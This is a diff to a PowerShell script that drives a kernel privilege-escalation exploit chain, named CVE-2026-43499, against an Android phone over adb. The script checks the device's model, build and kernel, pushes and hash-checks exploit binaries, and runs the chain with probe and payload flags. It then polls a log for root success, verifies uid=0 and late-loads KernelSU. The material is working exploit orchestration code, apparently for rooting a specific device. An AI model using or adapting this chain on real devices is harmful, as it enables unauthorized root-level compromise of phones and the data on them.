@@ -39,7 +39,7 @@ function Invoke-Adb {
             $ErrorActionPreference = $savedErrorAction
         }
     }
-    if ($exitCode -ne 0) { throw "adb failed: $($result -join "`n")" }
+    if ($exitCode -ne 0) { throw "adb $($args -join ' ') failed ($exitCode): $($result -join "`n")" }
     return ($result -join "`n")
 }
 
@@ -62,64 +62,71 @@ do {
     $boot = (Invoke-Adb shell getprop sys.boot_completed).Trim()
     $deviceBoot = (Invoke-Adb shell getprop dev.bootcomplete).Trim()
     $bootAnim = (Invoke-Adb shell getprop init.svc.bootanim).Trim()
-    $userData = (Invoke-Adb shell getprop sys.user.0.ce_available).Trim()
-    if ($boot -eq "1" -and $deviceBoot -eq "1" -and $bootAnim -eq "stopped" -and $userData -eq "true") { break }
+    if ($boot -eq "1" -and $deviceBoot -eq "1" -and $bootAnim -eq "stopped") { break }
     Start-Sleep -Seconds 3
 } while ((Get-Date) -lt $deadline)
-if ($boot -ne "1" -or $deviceBoot -ne "1" -or $bootAnim -ne "stopped" -or $userData -ne "true") {
-    throw "boot did not finish or user data is locked; unlock the phone"
+if ($boot -ne "1" -or $deviceBoot -ne "1" -or $bootAnim -ne "stopped") {
+    throw "boot did not finish"
 }
 Start-Sleep -Seconds 30
 
 $actualModel = (Invoke-Adb shell getprop ro.product.model).Trim()
 $actualBuild = (Invoke-Adb shell getprop ro.build.version.incremental).Trim()
 $actualKernel = (Invoke-Adb shell uname -r).Trim()
-$actualTrace = (Invoke-Adb shell cat /sys/kernel/tracing/events/sched/sched_blocked_reason/id).Trim()
 if ($actualModel -ne $target.TARGET_MODEL) { throw "wrong model: $actualModel" }
 if ($actualBuild -ne $target.TARGET_BUILD) { throw "wrong build: $actualBuild" }
 if ($actualKernel -ne $target.TARGET_KERNEL_RELEASE) { throw "wrong kernel: $actualKernel" }
-if ($actualTrace -ne $target.TRACE_EVENT_ID) { throw "wrong sched trace id: $actualTrace" }
 
 $modules = Invoke-Adb shell cat /proc/modules
 if ($modules -match "(?m)^kernelsu ") {
-    $suState = Invoke-Adb shell "/system/bin/su -c id"
+    $suState = Invoke-Adb shell /system/bin/su -c id
     throw "KernelSU is already live: $suState. Reboot before running the exploit again."
 }
 
 $localWrite = Join-Path $Artifacts "cve-2026-43499-write"
 $localBridge = Join-Path $Artifacts "cve-2026-43499-bridge"
 $localRoot = Join-Path $Artifacts "cve-2026-43499-root"
-foreach ($path in @($localWrite, $localBridge, $localRoot)) {
+$localProbe = Join-Path $Artifacts "page-leak-probe"
+foreach ($path in @($localWrite, $localBridge, $localRoot, $localProbe)) {
     if (-not (Test-Path $path -PathType Leaf)) { throw "missing artifact: $path" }
 }
 
 $remoteWrite = "/data/local/tmp/rmg-write"
 $remoteBridge = "/data/local/tmp/rmg-bridge"
 $remoteRoot = "/data/local/tmp/rmg-root"
+$remoteProbe = "/data/local/tmp/rmg-probe"
 $remoteLog = "/data/local/tmp/rmg-chain.log"
-Invoke-Adb push $localWrite $remoteWrite | Out-Null
-Invoke-Adb push $localBridge $remoteBridge | Out-Null
-Invoke-Adb push $localRoot $remoteRoot | Out-Null
-Invoke-Adb shell chmod 755 $remoteWrite $remoteBridge $remoteRoot | Out-Null
+$deploy = @(
+    @{ Local = $localWrite; Remote = $remoteWrite },
+    @{ Local = $localBridge; Remote = $remoteBridge },
+    @{ Local = $localRoot; Remote = $remoteRoot },
+    @{ Local = $localProbe; Remote = $remoteProbe }
+)
+foreach ($item in $deploy) {
+    Invoke-Adb push $item.Local $item.Remote | Out-Null
+}
+Invoke-Adb shell chmod 755 $remoteWrite $remoteBridge $remoteRoot $remoteProbe | Out-Null
+foreach ($item in $deploy) {
+    $hostHash = (Get-FileHash -Algorithm SHA256 $item.Local).Hash.ToLowerInvariant()
+    $deviceHash = ((Invoke-Adb shell sha256sum $item.Remote) -split '\s+')[0].ToLowerInvariant()
+    if ($hostHash -ne $deviceHash) { throw "sha256 mismatch: $($item.Remote)" }
+    Write-Host "sha256 $deviceHash $($item.Remote)"
+}
 
-$killStale = 'for name in rmg-bridge rmg-write; do for pid in $(pidof $name); do kill $pid; done; done'
+$killStale = 'for name in rmg-bridge rmg-write rmg-probe; do for pid in $(pidof $name); do kill $pid; done; done'
 Invoke-Adb shell $killStale | Out-Null
 
-$slideOut = Invoke-Adb shell "$remoteWrite slide"
-$match = [regex]::Match($slideOut, "physical slide=(0x[0-9a-fA-F]+|[0-9]+)")
-if (-not $match.Success) { throw "slide not found: $slideOut" }
-$slide = $match.Groups[1].Value
-Invoke-Adb shell ": > $remoteLog; $remoteBridge chain $slide $remoteWrite > $remoteLog 2>&1 &" | Out-Null
+Invoke-Adb shell ": > $remoteLog; A536_KS_PROBE=$remoteProbe A536_KS_SKB_PAYLOAD=1 $remoteBridge chain-ks-auto $remoteWrite > $remoteLog 2>&1 &" | Out-Null
 
 $rootOk = $false
-for ($i = 0; $i -lt 90; $i++) {
+for ($i = 0; $i -lt 150; $i++) {
     Start-Sleep -Seconds 1
     $log = Invoke-Adb shell cat $remoteLog
     if ($log -match "ROOT_OK") { $rootOk = $true; break }
-    if ($log -match "CHAIN_FAIL|ARW_FAIL|ROOT_FAIL") { break }
+    if ($log -match "CHAIN_FAIL|ARW_FAIL|ROOT_FAIL|slide auto failed|ks probe failed") { break }
 }
 if (-not $rootOk) { throw "root chain failed: $log" }
-$id = Invoke-Adb shell "$remoteRoot -c id"
+$id = Invoke-Adb shell $remoteRoot -c id
 if ($id -notmatch "uid=0") { throw "root check failed: $id" }
 
 if ($RootOnly) {
@@ -127,10 +134,6 @@ if ($RootOnly) {
     return
 }
 
-$actualPageAlloc = (Invoke-Adb shell "$remoteRoot -c 'cat /sys/kernel/tracing/events/kmem/mm_page_alloc/id'").Trim()
-$actualCacheAlloc = (Invoke-Adb shell "$remoteRoot -c 'cat /sys/kernel/tracing/events/kmem/kmem_cache_alloc/id'").Trim()
-if ($actualPageAlloc -ne $target.MM_PAGE_ALLOC_ID) { throw "wrong page trace id: $actualPageAlloc" }
-if ($actualCacheAlloc -ne $target.KMEM_CACHE_ALLOC_ID) { throw "wrong cache trace id: $actualCacheAlloc" }
 Write-Host "shell root ok: $id"
 
 if (-not $KsudPath) { return }
@@ -142,11 +145,11 @@ $remoteStage = "/data/local/tmp/.ksud-stage"
 Invoke-Adb push $KsudPath $remoteStage | Out-Null
 Invoke-Adb shell chmod 755 $remoteStage | Out-Null
 Write-Host "late-loading KernelSU"
-$load = Invoke-Adb shell "$remoteRoot --late-load"
+$load = Invoke-Adb shell $remoteRoot --late-load
 Write-Host $load
 Start-Sleep -Seconds 2
-$modules = Invoke-Adb shell "/system/bin/su -c 'cat /proc/modules'"
+$modules = Invoke-Adb shell cat /proc/modules
 if ($modules -notmatch "(?m)^kernelsu ") { throw "KernelSU module is not live" }
-$suId = Invoke-Adb shell "/system/bin/su -c id"
+$suId = Invoke-Adb shell /system/bin/su -c id
 if ($suId -notmatch "uid=0") { throw "KernelSU su failed: $suId" }
 Write-Host "KernelSU root ok: $suId"
